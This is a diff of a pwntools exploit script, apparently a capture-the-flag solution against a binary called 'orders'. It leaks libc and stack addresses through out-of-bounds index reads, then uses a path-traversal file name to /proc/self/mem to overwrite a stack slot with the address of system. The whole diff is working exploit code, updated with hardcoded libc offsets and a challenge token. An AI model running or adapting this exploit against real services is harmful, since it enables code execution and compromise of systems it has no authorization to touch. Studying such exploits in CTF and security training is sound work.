@@ -25,31 +25,32 @@ def edit(filename: bytes, where: int, what: int):
 
 if args.LOCAL:
     context.binary = exe = ELF('./orders')
-    io = process([exe.path], env={'LD_PRELOAD':'./libc.so.6'})
+    io = process([exe.path], env={'LD_PRELOAD':'./libc.so.6', 'TOKEN': 'task_token'})
 else:
-    io = remote('0', 13002)
+    io = remote(sys.argv[1], 13002)
 
-libc = ELF('./libc.so.6')
 
 items_addr = 0x404020
 
-id = add((0x403F90-items_addr)//0x10)
+io.sendlineafter(b'token: ', 'task_token')
+
+id = add((0x403F80-items_addr)//0x10)
 get(id)
 io.recvuntil('0. ')
-libc.address = unpack(io.recv(6), 'all') - libc.sym.write
-log.success('libc: ' + hex(libc.address))
+libc = unpack(io.recv(6), 'all') - 0x114a20
+log.success('libc: ' + hex(libc))
 
-id = add((libc.sym.environ-items_addr)//0x10)
+id = add((libc+0x221200-items_addr)//0x10)
 get(id)
 io.recvuntil('0. ')
 stack = unpack(io.recv(6), 'all')
 log.success('stack: ' + hex(stack))
 
-system_addr = stack-0x1b8
+system_addr = stack-0x200
 
 edit(
-    filename=b'../../../proc/self/mem\0\0'+p64(libc.sym.system),
-    where=(0x403F90)//0x10,
+    filename=b'../../../proc/self/mem\0\0'+p64(libc+0x50d60),
+    where=(0x403F80)//0x10,
     what=(system_addr - items_addr)//0x10,
 )
 
